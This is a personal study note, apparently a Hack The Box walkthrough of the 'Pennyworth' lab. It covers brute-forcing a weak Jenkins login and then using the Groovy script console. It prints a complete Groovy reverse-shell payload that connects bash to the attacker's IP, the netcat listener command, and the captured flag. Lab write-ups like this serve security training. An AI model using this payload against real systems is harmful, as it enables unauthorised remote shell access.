2022-07-07 18:23
source: [HTB](obsidian://open?vault=iswearthisismylast&file=Files%2FPennyworth.pdf)
tags: #research #htb #pennyworth #cybersec #java #Attacks/Weak_Password #jenkins 

# Pennyworth

## Thought Process
As always, [[nmap]] scan for ports. 

I tried to access the ip after putting into `/etc/hosts` but wouldn't load.
- This was due to the port running on 8080 and also on http not https

Hit a login screen for [[Jenkins]]
- Tried looking for default username and password, but username is Admin and password is random generated and resides in a protected folder in the server.
- The box description had weak password, so decided to load in [[Burp Suite]] and bruteforce with rockyou.txt
     - rockyou.txt is too big for my small brain kali linux.  running shorter version
     - 302 is a http redirect [[HTTP Response Status Codes]] This bamboozled me. The password was able to be found using shortened rockyou, but I didn't know it was correct as I was looking for 200 code.

Checked version of Jenkins, it is confirmed secure after checking CVE
    [[Jenkins#Hacking]]
 That is where I got stuck

## Summary
Use [[nmap]], check service.
Its [[Jenkins]]. Try bruteforcing. Its root:password. This was sketch as most google searches say the Jenkins password is random gen. But... htb disagrees wtf anyways after logging in, It has [[groovy]] enabled. This is where I can send arbitrary groovy command to the server. 
Goal is to open a [[Reverse Shell]]. We can use [[PayloadsAllTheThings]] 
Grab this script for groovy
```
String host="{your_IP}";
int port=8000;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),
si=s.getInputStream();OutputStream
po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())
{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try
{p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
this script attempts to connect to my ip thru port 8000 and run bash to do it.
if our target ran windows, it would be `cmd.exe`
Get IP by using [[ip]] a | grep tun0 (stands for tunnel0 (vpn))
run [nc](netcat) -lvnp 8000 on our server
now run the script on jenkins, (the script above has newline so it won't work lmao just grab it from the link) which then we will be able to see that a connection happened
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8000        
listening on [any] 8000 ...
connect to [10.10.16.5] from (UNKNOWN) [10.129.37.11] 50754
```
now, cat root/flag.txt.
ez.
9cdfb439c7876e703e307864c9167a15